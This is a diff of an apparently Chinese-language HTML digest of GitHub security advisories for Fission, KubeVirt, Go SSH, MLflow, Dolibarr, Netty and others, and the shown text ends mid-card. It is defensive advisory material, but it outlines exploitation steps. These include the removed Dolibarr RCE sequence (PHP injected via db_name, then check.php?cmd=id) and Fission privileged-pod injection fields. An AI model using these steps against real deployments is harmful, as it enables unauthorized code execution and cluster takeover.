@@ -6,943 +6,717 @@
     <title>GitHub安全公告日报 - 2026-07-01</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif;
-            background: #0d1117; color: #c9d1d9; min-height: 100vh; line-height: 1.6;
-        }
-        header {
-            background: linear-gradient(135deg, #161b22 0%, #0d1117 100%);
-            border-bottom: 1px solid #30363d; padding: 40px 20px; text-align: center;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; line-height: 1.6; }
+        header { background: linear-gradient(135deg, #161b22 0%, #0d1117 100%); border-bottom: 1px solid #30363d; padding: 40px 20px; text-align: center; }
         header h1 { font-size: 2em; color: #f0f6fc; margin-bottom: 8px; }
         header p { color: #8b949e; }
         .container { max-width: 1200px; margin: 0 auto; padding: 30px 20px; }
-        
-        .stats-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 16px; margin-bottom: 30px;
-        }
-        .stat-card {
-            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
-            padding: 20px; text-align: center;
-        }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 30px; }
+        .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; text-align: center; }
         .stat-number { font-size: 2.5em; font-weight: bold; color: #58a6ff; }
         .stat-label { color: #8b949e; font-size: 0.9em; margin-top: 4px; }
-        
-        .section-title {
-            font-size: 1.5em; color: #f0f6fc; margin: 30px 0 20px;
-            padding-bottom: 8px; border-bottom: 1px solid #21262d;
-        }
-        
-        .advisory-card {
-            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
-            padding: 24px; margin-bottom: 20px; border-left: 4px solid #30363d;
-        }
+        .section-title { font-size: 1.5em; color: #f0f6fc; margin: 30px 0 20px; padding-bottom: 8px; border-bottom: 1px solid #21262d; }
+        .advisory-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; margin-bottom: 20px; border-left: 4px solid #30363d; }
         .advisory-card.critical { border-left-color: #f85149; }
         .advisory-card.high { border-left-color: #d29922; }
         .advisory-card.medium { border-left-color: #8b949e; }
-        
-        .advisory-header {
-            display: flex; justify-content: space-between; align-items: start;
-            margin-bottom: 16px; flex-wrap: wrap; gap: 12px;
-        }
+        .advisory-header { display: flex; justify-content: space-between; align-items: start; margin-bottom: 16px; flex-wrap: wrap; gap: 12px; }
         .advisory-title { font-size: 1.2em; color: #f0f6fc; }
         .advisory-id { color: #58a6ff; font-family: monospace; font-size: 0.85em; }
-        
-        .badge {
-            display: inline-block; padding: 4px 12px; border-radius: 20px;
-            font-size: 0.8em; font-weight: 600; margin-right: 8px; margin-bottom: 8px;
-        }
+        .badge { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 0.8em; font-weight: 600; margin-right: 8px; margin-bottom: 8px; }
         .badge-critical { background: #da363322; color: #f85149; border: 1px solid #da363344; }
         .badge-high { background: #d2992222; color: #d29922; border: 1px solid #d2992244; }
         .badge-stars { background: #d2992222; color: #d29922; border: 1px solid #d2992244; }
         .badge-poc { background: #da363322; color: #f85149; border: 1px solid #da363344; }
         .badge-analysis { background: #388bfd22; color: #58a6ff; border: 1px solid #388bfd44; }
-        
         .advisory-meta { margin-bottom: 16px; }
         .advisory-content { color: #8b949e; margin-bottom: 16px; }
         .advisory-content strong { color: #c9d1d9; }
         .advisory-content ul { margin-left: 20px; margin-top: 8px; }
         .advisory-content li { margin-bottom: 6px; }
-        
-        .priority-score {
-            display: inline-block; padding: 6px 14px; border-radius: 6px;
-            font-size: 0.85em; font-weight: 600; background: #388bfd22;
-            color: #58a6ff; border: 1px solid #388bfd44;
-        }
-        
-        .summary-table {
-            width: 100%; border-collapse: collapse; margin-top: 20px;
-            background: #161b22; border-radius: 8px; overflow: hidden;
-        }
-        .summary-table th {
-            background: #21262d; color: #f0f6fc; padding: 12px; text-align: left;
-            font-size: 0.85em; text-transform: uppercase;
-        }
+        .priority-score { display: inline-block; padding: 6px 14px; border-radius: 6px; font-size: 0.85em; font-weight: 600; background: #388bfd22; color: #58a6ff; border: 1px solid #388bfd44; }
+        .summary-table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #161b22; border-radius: 8px; overflow: hidden; }
+        .summary-table th { background: #21262d; color: #f0f6fc; padding: 12px; text-align: left; font-size: 0.85em; text-transform: uppercase; }
         .summary-table td { padding: 12px; border-top: 1px solid #30363d; }
         .summary-table tr:hover { background: #1c2128; }
-        
-        footer {
-            text-align: center; padding: 30px; color: #484f58; border-top: 1px solid #21262d;
-            margin-top: 40px; font-size: 0.85em;
-        }
+        footer { text-align: center; padding: 30px; color: #484f58; border-top: 1px solid #21262d; margin-top: 40px; font-size: 0.85em; }
         footer a { color: #58a6ff; text-decoration: none; }
     </style>
 </head>
 <body>
     <header>
         <h1>🛡️ GitHub 安全公告日报</h1>
-        <p>2026-07-01 · 监控最近24小时 Critical & High 级别安全公告</p>
+        <p>2026-07-01 · 监控最近24小时 Critical &amp; High 级别安全公告</p>
     </header>
-    
     <div class="container">
-        <!-- 监控概况 -->
         <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-number">34</div>
-                <div class="stat-label">总公告数</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number">17</div>
-                <div class="stat-label">Critical</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number">17</div>
-                <div class="stat-label">High</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number">9</div>
-                <div class="stat-label">Star≥5k 项目</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number">12</div>
-                <div class="stat-label">含PoC/详细分析</div>
-            </div>
+            <div class="stat-card"><div class="stat-number">16</div><div class="stat-label">总公告数</div></div>
+            <div class="stat-card"><div class="stat-number">4</div><div class="stat-label">Critical</div></div>
+            <div class="stat-card"><div class="stat-number">12</div><div class="stat-label">High</div></div>
+            <div class="stat-card"><div class="stat-number">10</div><div class="stat-label">Star≥5k 项目</div></div>
+            <div class="stat-card"><div class="stat-number">16</div><div class="stat-label">含PoC/详细分析</div></div>
         </div>
         
-        <!-- 漏洞详情 -->
         <h2 class="section-title">🚨 需要关注的漏洞（按优先级排序）</h2>
-        
-        <!-- 1. Fission 容器逃逸系列 -->
+
         <div class="advisory-card critical">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🔴 Fission Kubernetes 容器逃逸系列漏洞（4个关联公告）</div>
-                    <div class="advisory-id">GHSA-wmgg-3p4h-48x7 / GHSA-gx55-f84r-v3r7 / GHSA-v455-mv2v-5g92 / GHSA-m63v-2g9w-2w6v | CVE-2026-50545 / CVE-2026-50564 / CVE-2026-50563 / CVE-2026-50566</div>
+                    <div class="advisory-title">🔴 紧急 Fission: Environment Runtime.Container and Builder.Container SecurityContext bypass allows privileged pod creation</div>
+                    <div class="advisory-id">GHSA-m63v-2g9w-2w6v | CVE: CVE-2026-50566</div>
                 </div>
-                <span class="priority-score">优先级: 极高</span>
+                <span class="priority-score">优先级: 8.8</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-critical">Critical (CVSS 9.9)</span>
-                <span class="badge badge-stars">⭐ 8,869</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-critical">CRITICAL · CVSS 9.9</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-poc">🔴 PoC Available</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Fission（Kubernetes Serverless框架）存在一系列严重的容器逃逸漏洞，涉及 Environment CRD 和 Function PodSpec 的多个攻击面。攻击者可通过构造恶意的 PodSpec 注入 hostPID/hostNetwork/privileged 等危险字段，绕过准入验证直接创建特权 Pod，最终实现从租户命名空间逃逸至宿主机节点甚至接管整个集群。</p>
-                <p><strong>影响产品：</strong>fission/fission ⭐8,869（Fast and Simple Serverless Functions for Kubernetes）</p>
-                <p><strong>影响版本：</strong>&lt;= 1.23.0</p>
-                <p><strong>攻击面：</strong></p>
-                <ul>
-                    <li><strong>GHSA-wmgg-3p4h-48x7（CVSS 9.9）：</strong>Environment CRD 的 <code>spec.runtime.podSpec</code> 和 <code>spec.builder.podSpec</code> 缺乏安全验证，且 Webhook 仅注册了 create verb，通过 <code>kubectl patch</code> 可绕过准入控制</li>
-                    <li><strong>GHSA-gx55-f84r-v3r7（CVSS 9.9）：</strong>Environment CRD podspec 直通合并，hostPID/hostNetwork/privileged 字段无过滤直接传播到生成的 Pod</li>
-                    <li><strong>GHSA-v455-mv2v-5g92（CVSS 9.9）：</strong>Container Executor 的 Function.spec.podspec 注入，<code>MergePodSpec</code> 无条件转发危险字段到 Deployment spec</li>
-                    <li><strong>GHSA-m63v-2g9w-2w6v（CVSS 9.9）：</strong>Environment CRD 的 <code>Runtime.Container.SecurityContext</code> 和 <code>Builder.Container.SecurityContext</code> 绕过 PodSpec 验证层，允许创建特权容器</li>
-                </ul>
-                <p><strong>触发条件：</strong>攻击者需要 Fission 命名空间的 create/update 权限（如 <code>environments.fission.io</code> 或 <code>functions.fission.io</code>），无需集群管理员权限</p>
-                <p><strong>潜在危害：</strong>容器逃逸 → 宿主机访问 → 集群完全接管。攻击者可读取所有 Secret、创建后门 Pod、横向移动到其他命名空间</p>
-                <p><strong>可利用性：</strong>有详细源码级漏洞原理分析，明确指出 <code>ValidatePodSpecSafety()</code> 函数不检查独立 Container 的 SecurityContext，<code>MergePodSpec</code> 无条件传播危险字段。攻击路径清晰</p>
-                <p><strong>修复建议：</strong>升级至 Fission &gt; 1.23.0。临时缓解：为 fission-function 和 fission-builder 命名空间添加 Pod Security Admission 标签（<code>pod-security.kubernetes.io/enforce: restricted</code>），限制 RBAC 对 Environment/Function CRD 的写入权限</p>
+                <p><strong>漏洞描述：</strong>Fission 的 Environment CRD 暴露了 <code>spec.runtime.container</code> 和 <code>spec.builder.container</code> 字段，其中的 SecurityContext 绕过了 PodSpec 验证层和 Merge 层的清理逻辑。攻击者可构造带有 <code>privileged: true</code> 的 Environment 对象，绕过 Admission Webhook 检查，在 Fission 运行时命名空间中创建特权容器。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-250, CWE-269</p>
+                <p><strong>攻击面：</strong>拥有 environments.fission.io create/update RBAC 权限的用户</p>
+                <p><strong>触发条件：</strong>创建包含 <code>spec.runtime.container.securityContext.privileged: true</code> 的 Environment CRD，Admission 不会拦截</p>
+                <p><strong>潜在危害：</strong>容器沙箱逃逸、宿主机文件系统和网络访问、潜在的节点和集群级别入侵</p>
+                <p><strong>可利用性：</strong>有完整PoC</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0；新增 ValidateContainerSafety 验证函数</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-wmgg-3p4h-48x7" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-m63v-2g9w-2w6v" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
-
-        <!-- 2. KubeVirt -->
-        <div class="advisory-card critical">
-            <div class="advisory-header">
-                <div>
-                    <div class="advisory-title">🔴 KubeVirt Symbolic Link Following 导致节点逃逸</div>
-                    <div class="advisory-id">GHSA-7jcp-v9w4-wjmg | CVE-2026-7374</div>
-                </div>
-                <span class="priority-score">优先级: 极高</span>
-            </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-critical">Critical (CVSS 9.9)</span>
-                <span class="badge badge-stars">⭐ 6,929</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
-            <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>KubeVirt 的 virt-handler 组件存在符号链接跟踪漏洞。具有命名空间 edit 权限的攻击者可通过将虚拟机控制台 socket 替换为指向宿主机 CRI-O socket 的符号链接，劫持 virt-handler 的特权连接，进而访问宿主机上任意 Unix socket。</p>
-                <p><strong>影响产品：</strong>kubevirt/kubevirt ⭐6,929（Kubernetes Virtualization API and runtime）</p>
-                <p><strong>影响版本：</strong>&gt;= 1.8.0-alpha.0, &lt; 1.8.3 | &gt;= 1.7.0-alpha.0, &lt; 1.7.4 | &lt; 1.6.6</p>
-                <p><strong>攻击面：</strong>virt-handler 在连接虚拟机控制台 socket 时未验证 socket 文件是否为符号链接，直接以特权身份连接</p>
-                <p><strong>触发条件：</strong>攻击者需要在单个命名空间内有 edit 权限，能够修改虚拟机的控制台 socket 文件</p>
-                <p><strong>潜在危害：</strong>通过劫持 virt-handler 的特权连接访问宿主机 CRI-O socket → 控制容器运行时 → 完全控制节点和集群。这是典型的容器/虚拟化逃逸链</p>
-                <p><strong>可利用性：</strong>有详细的漏洞原理描述，攻击路径清晰：替换 socket → 符号链接到 CRI-O socket → 劫持特权连接 → 节点控制</p>
-                <p><strong>修复建议：</strong>升级至 kubevirt 1.8.3 / 1.7.4 / 1.6.6 或更高版本。临时缓解：限制命名空间内用户对 VM 资源文件系统的写权限</p>
-            </div>
-            
-            <a href="https://github.com/advisories/GHSA-7jcp-v9w4-wjmg" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
-        </div>
-
-        <!-- 3. golang.org/x/crypto/ssh -->
-        <div class="advisory-card critical">
-            <div class="advisory-header">
-                <div>
-                    <div class="advisory-title">🔴 golang.org/x/crypto/ssh 系列漏洞（权限绕过 + DoS）</div>
-                    <div class="advisory-id">GHSA-x527-x647-q7gg / GHSA-5cgq-3rg8-m6cv / GHSA-vgwf-h737-ff37 / GHSA-f5wc-c3c7-36mc / GHSA-w879-237q-wc7r | CVE-2026-46595 / CVE-2026-42508 / CVE-2026-39830 / CVE-2026-39832 / CVE-2026-39829</div>
-                </div>
-                <span class="priority-score">优先级: 极高</span>
-            </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-critical">Critical (CVSS 10.0 / 9.1)</span>
-                <span class="badge badge-stars">⭐ 3,325 (Go crypto 标准扩展库)</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
-            <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Go 语言官方 SSH 库 golang.org/x/crypto/ssh 发布 5 个安全公告，涵盖认证绕过、权限跳过、Agent 约束丢失、死锁和 DoS 等多种漏洞类型。这是 Go 生态中最核心的 SSH 实现，影响面极广。</p>
-                <p><strong>影响产品：</strong>golang.org/x/crypto/ssh（Go 标准加密扩展库，被大量 Go 项目依赖）</p>
-                <p><strong>影响版本：</strong>&lt; 0.52.0</p>
-                <p><strong>各漏洞详情：</strong></p>
-                <ul>
-                    <li><strong>CVE-2026-46595（CVSS 10.0）：</strong>VerifiedPublicKeyCallback 权限跳过 — 使用非 PublicKey 类型的回调时，源地址验证会被跳过（CVE-2024-45337 的绕过变体），可绕过访问控制</li>
-                    <li><strong>CVE-2026-42508（CVSS 9.1）：</strong>knownhosts 未强制检查 @revoked 状态 — CA 的 SignatureKey 被吊销后未被正确检查，可使用已吊销密钥通过认证</li>
-                    <li><strong>CVE-2026-39830：</strong>客户端可触发服务端死锁 — 发送异常响应导致服务端阻塞</li>
-                    <li><strong>CVE-2026-39832：</strong>SSH Agent 转发密钥时未丢弃调用者约束 — 密钥约束在转发过程中丢失，可能被滥用</li>
-                    <li><strong>CVE-2026-39829：</strong>病态 RSA/DSA 参数导致 DoS — 服务端处理畸形密钥参数时资源耗尽</li>
-                </ul>
-                <p><strong>攻击面：</strong>所有使用 golang.org/x/crypto/ssh 的 Go SSH 服务端和客户端，包括 SSH 代理转发、knownhosts 验证等场景</p>
-                <p><strong>触发条件：</strong>针对 CVE-2026-46595：服务端使用了非标准 PublicKey 回调类型；针对 CVE-2026-42508：known_hosts 文件中存在 @revoked 标记的 CA 密钥</p>
-                <p><strong>潜在危害：</strong>认证绕过可让未授权用户访问 SSH 服务；已知密钥吊销失效使被盗密钥仍可被使用；DoS 可使 SSH 服务不可用</p>
-                <p><strong>可利用性：</strong>有详细的漏洞成因分析，CVE-2026-46595 明确描述了回调类型判断逻辑缺陷，CVE-2026-42508 指出 key.SignatureKey 的 @revoked 检查遗漏</p>
-                <p><strong>修复建议：</strong>立即升级至 golang.org/x/crypto v0.52.0 或更高版本。这是 Go 官方库，升级风险低</p>
-            </div>
-            
-            <a href="https://github.com/advisories/GHSA-x527-x647-q7gg" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
-        </div>
-
-        <!-- 4. MLflow -->
-        <div class="advisory-card critical">
-            <div class="advisory-header">
-                <div>
-                    <div class="advisory-title">🔴 MLflow 多部分上传端点未授权访问（供应链投毒）</div>
-                    <div class="advisory-id">GHSA-8c7q-86fq-vvmh | CVE-2026-2651</div>
-                </div>
-                <span class="priority-score">优先级: 极高</span>
-            </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-critical">Critical (CVSS 9.0)</span>
-                <span class="badge badge-stars">⭐ 26,796</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
-            <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>MLflow 在启用 <code>--serve-artifacts</code> 模式时，多部分上传（MPU）端点 <code>/mlflow-artifacts/mpu/*</code> 缺乏资源级别的权限检查。攻击者可以未授权覆盖其他用户的 artifact，实现跨用户写入、模型供应链投毒，当被篡改的模型被加载时可触发任意代码执行。</p>
-                <p><strong>影响产品：</strong>mlflow/mlflow ⭐26,796（The open source AI engineering platform for agents, LLMs, and ML models）</p>
-                <p><strong>影响版本：</strong>&lt; 3.11.0rc0（修复版本 3.10.0）</p>
-                <p><strong>攻击面：</strong><code>/mlflow-artifacts/mpu/*</code> 端点 — 多部分上传 API 未对调用者进行资源所有权验证</p>
-                <p><strong>触发条件：</strong>MLflow 服务启用了 <code>--serve-artifacts</code> 模式，且攻击者能够访问 MLflow 服务端点（内网或暴露在外）</p>
-                <p><strong>潜在危害：</strong>供应链攻击 — 攻击者覆盖模型 artifact → 其他用户/流水线加载被篡改的模型 → 任意代码执行。在 MLOps 生产环境中影响尤为严重</p>
-                <p><strong>可利用性：</strong>有详细的漏洞利用路径描述，攻击者仅需知道目标 artifact 路径即可通过 MPU API 覆盖内容</p>
-                <p><strong>修复建议：</strong>升级至 MLflow 3.10.0 或更高版本。临时缓解：禁用 <code>--serve-artifacts</code> 模式，或在反向代理层限制 MPU 端点访问</p>
-            </div>
-            
-            <a href="https://github.com/advisories/GHSA-8c7q-86fq-vvmh" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
-        </div>
-
-        <!-- 5. Dolibarr -->
-        <div class="advisory-card critical">
-            <div class="advisory-header">
-                <div>
-                    <div class="advisory-title">🔴 Dolibarr ERP CRM 未授权远程代码执行</div>
-                    <div class="advisory-id">GHSA-hxmh-2xc4-c894 | CVE-2018-25357</div>
-                </div>
-                <span class="priority-score">优先级: 极高</span>
-            </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-critical">Critical (CVSS 9.8)</span>
-                <span class="badge badge-stars">⭐ 7,358</span>
-                <span class="badge badge-poc">🔴 PoC Available</span>
-            </div>
-            
-            <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Dolibarr ERP CRM 7.0.3 安装向导存在远程代码执行漏洞。未认证攻击者可通过向 <code>install/step1.php</code> 发送 POST 请求，在 <code>db_name</code> 参数中注入 PHP 代码，然后通过 <code>check.php</code> 端点的 <code>cmd</code> GET 参数执行任意系统命令。</p>
-                <p><strong>影响产品：</strong>Dolibarr/dolibarr ⭐7,358（Modern ERP/CRM 软件）</p>
-                <p><strong>影响版本：</strong>&gt;= 7.0.0, &lt;= 7.0.3 | &lt; 6.0.8</p>
-                <p><strong>攻击面：</strong>安装向导 <code>/install/step1.php</code> 和 <code>/check.php</code> 端点 — 无需认证即可访问</p>
-                <p><strong>触发条件：</strong>Dolibarr 实例的安装向导未被删除或限制访问（常见于新部署或测试环境）</p>
-                <p><strong>潜在危害：</strong>完全未认证的远程代码执行，攻击者可获取 Web 服务器权限，进而提权、窃取数据库、横向移动。CVSS 9.8 反映了其极高的可利用性和危害</p>
-                <p><strong>可利用性：</strong>有完整的 PoC 利用步骤：(1) POST 到 install/step1.php 注入 PHP 代码到 db_name；(2) GET check.php?cmd=id 执行命令。利用极其简单</p>
-                <p><strong>修复建议：</strong>升级至 Dolibarr &gt; 7.0.3 或 &gt; 6.0.8。务必在生产部署后立即删除 /install 目录或限制访问。检查所有 Dolibarr 实例是否遗留了安装向导</p>
-            </div>
-            
-            <a href="https://github.com/advisories/GHSA-hxmh-2xc4-c894" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
-        </div>
-
-        <!-- 6. Netty HTTP/3 -->
         <div class="advisory-card high">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🟠 Netty HTTP/3 QPACK 解码器未受限内存分配（含PoC）</div>
-                    <div class="advisory-id">GHSA-2c5c-chwr-9hqw | CVE-2026-42582</div>
+                    <div class="advisory-title">🟠 高危 Fission Environment CRD podspec passthrough enables hostPID/hostNetwork/privileged pods, node escape</div>
+                    <div class="advisory-id">GHSA-gx55-f84r-v3r7 | CVE: CVE-2026-50564</div>
                 </div>
-                <span class="priority-score">优先级: 高危</span>
+                <span class="priority-score">优先级: 7.9</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-high">High (CVSS 7.5)</span>
-                <span class="badge badge-stars">⭐ 34,998</span>
-                <span class="badge badge-poc">🔴 PoC Available</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-critical">CRITICAL · CVSS 9.9</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>Netty HTTP/3 编解码器在解码 QPACK 头部时，非 Huffman 分支的 <code>QpackDecoder#decodeHuffmanEncodedLiteral</code> 方法在验证实际可用字节数之前，直接使用来自报文的 length 字段执行 <code>new byte[length]</code>。攻击者可构造极小的 HTTP/3 HEADERS 帧声明超大长度（GB级别），导致服务端内存耗尽。</p>
-                <p><strong>影响产品：</strong>netty/netty ⭐34,998（Java 网络应用框架）</p>
-                <p><strong>影响版本：</strong>io.netty:netty-codec-http3 &gt;= 4.2.0.Final, &lt;= 4.2.12.Final</p>
-                <p><strong>攻击面：</strong>任何暴露 HTTP/3 端口的 Netty 服务端</p>
-                <p><strong>触发条件：</strong>服务端启用了 HTTP/3 支持且使用受影响版本的 netty-codec-http3</p>
-                <p><strong>潜在危害：</strong>远程 DoS — 单个恶意请求即可导致 OOM，影响服务可用性。由于 HTTP/3 基于 QUIC/UDP，攻击者可轻易伪造大量请求</p>
-                <p><strong>可利用性：</strong>有完整的 PoC 测试代码，构造 ~1GiB 声明长度的 QPACK 头部仅需极少字节。利用门槛极低</p>
-                <p><strong>修复建议：</strong>升级至 Netty &gt; 4.2.12.Final。临时缓解：在反向代理层禁用 HTTP/3 或限制 QUIC 连接速率</p>
+                <p><strong>漏洞描述：</strong>Fission 的 Environment CRD 暴露了 <code>spec.runtime.podSpec</code> 和 <code>spec.builder.podSpec</code>，合并逻辑直接传播了 hostNetwork、hostPID、hostIPC、container privileged 等危险字段。验证 Webhook 仅注册了 create 操作，update/patch 请求完全绕过。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-269, CWE-284, CWE-693</p>
+                <p><strong>攻击面：</strong>拥有 environments.fission.io create/update RBAC 权限的用户</p>
+                <p><strong>触发条件：</strong>kubectl apply 创建 Environment 后 kubectl patch 注入危险字段（绕过仅检查 create 的 webhook）</p>
+                <p><strong>潜在危害：</strong>节点逃逸、读取集群 CA 私钥、签署任意 kubelet 证书实现集群接管</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0；Admission denylist + Webhook 扩展 + Merge 层清理</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-2c5c-chwr-9hqw" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-gx55-f84r-v3r7" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
-
-        <!-- 7. flash-attention -->
         <div class="advisory-card high">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🟠 flash-attention 不安全反序列化（模型加载 RCE）</div>
-                    <div class="advisory-id">GHSA-7g5w-pq96-8c5w | CVE-2026-31253</div>
+                    <div class="advisory-title">🟠 高危 Fission Container Executor Function PodSpec Injection Leading to Node Escape</div>
+                    <div class="advisory-id">GHSA-v455-mv2v-5g92 | CVE: CVE-2026-50563</div>
                 </div>
-                <span class="priority-score">优先级: 高危</span>
+                <span class="priority-score">优先级: 7.9</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-high">High (CVSS 7.3)</span>
-                <span class="badge badge-stars">⭐ 24,307</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-critical">CRITICAL · CVSS 9.9</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
-                <p><strong>漏洞描述：</strong>flash-attention 训练框架的 checkpoint 加载机制存在不安全反序列化漏洞。<code>checkpoint.py</code> 中的 <code>load_checkpoint()</code> 和 <code>eval.py</code> 的 checkpoint 加载代码使用了 <code>torch.load()</code> 但未启用 <code>weights_only=True</code> 安全参数，允许通过 pickle 模块反序列化任意 Python 对象。</p>
-                <p><strong>影响产品：</strong>Dao-AILab/flash-attention ⭐24,307（Fast and memory-efficient exact attention）</p>
-                <p><strong>影响版本：</strong>&lt;= 2.8.3（commit e724e2588cbe754beb97cf7c011b5e7e34119e62 及之前）</p>
-                <p><strong>攻击面：</strong>模型 checkpoint 加载路径 — warmstarting 和 evaluation 流程</p>
-                <p><strong>触发条件：</strong>受害者加载攻击者提供的恶意 checkpoint 文件（例如从不可信来源下载的预训练权重）</p>
-                <p><strong>潜在危害：</strong>在 AI/ML 训练环境中执行任意代码。攻击者可制作恶意 checkpoint 投放到 HuggingFace Hub 等模型仓库，诱导研究者加载后获得 RCE</p>
-                <p><strong>可利用性：</strong>有详细的漏洞原理：torch.load() 默认使用 pickle 反序列化，恶意 checkpoint 可嵌入任意 Python 对象。利用路径清晰</p>
-                <p><strong>修复建议：</strong>升级至 flash-attention &gt; 2.8.3。在加载任何 checkpoint 时使用 <code>torch.load(path, weights_only=True)</code>。不要从不可信来源加载模型权重</p>
+                <p><strong>漏洞描述：</strong>Fission Container Executor 路径允许租户通过 <code>Function.spec.podspec</code> 直接注入 PodSpec，合并逻辑无条件转发危险字段。攻击门槛更低——普通函数开发者通常持有 functions/create 权限即可利用。</p>
+                <p><strong>影响产品：</strong>fission/fission ⭐8.9k</p>
+                <p><strong>影响版本：</strong>go/github.com/fission/fission (<= 1.23.0) → 修复: 1.24.0</p>
+                <p><strong>CWE类型：</strong>CWE-269, CWE-284</p>
+                <p><strong>攻击面：</strong>拥有 functions.fission.io create 权限的租户（门槛低于 Environment 路径）</p>
+                <p><strong>触发条件：</strong>创建带有恶意 podSpec 的 Function 对象（挂载宿主机根目录、共享命名空间）</p>
+                <p><strong>潜在危害：</strong>节点逃逸——通过高权限 ServiceAccount 调度的特权容器实现宿主机访问</p>
+                <p><strong>可利用性：</strong>有详细原理</p>
+                <p><strong>修复建议：</strong>升级到 Fission v1.24.0；FunctionSpec.Validate 调用 ValidatePodSpecSafety</p>
             </div>
-            
-            <a href="https://github.com/advisories/GHSA-7g5w-pq96-8c5w" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+            <a href="https://github.com/advisories/GHSA-v455-mv2v-5g92" target="_blank" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
         </div>
-
-        <!-- 8. Prefect -->
         <div class="advisory-card high">
             <div class="advisory-header">
                 <div>
-                    <div class="advisory-title">🟠 Prefect GitHubRepository 参数注入（SSRF/RCE）</div>
-                    <div class="advisory-id">GHSA-cw25-2p92-7f75 | CVE-2026-3515</div>
+                    <div class="advisory-title">🟠 高危 Fission Environment CRD PodSpec Injection Leading to Node Escape and Cluster Takeover</div>
+                    <div class="advisory-id">GHSA-wmgg-3p4h-48x7 | CVE: CVE-2026-50545</div>
                 </div>
-                <span class="priority-score">优先级: 高危</span>
+                <span class="priority-score">优先级: 7.9</span>
             </div>
-            
-            <div class="advisory-meta">
-                <span class="badge badge-high">High (CVSS 8.5)</span>
-                <span class="badge badge-stars">⭐ 22,720</span>
-                <span class="badge badge-analysis">📖 详细原理</span>
-            </div>
-            
+            <div class="advisory-meta"><span class="badge badge-critical">CRITICAL · CVSS 9.9</span>
+<span class="badge badge-stars">⭐ 8.9k (fission/fission)</span>
+<span class="badge badge-analysis">📖 详细分析</span>
+</div>
             <div class="advisory-content">
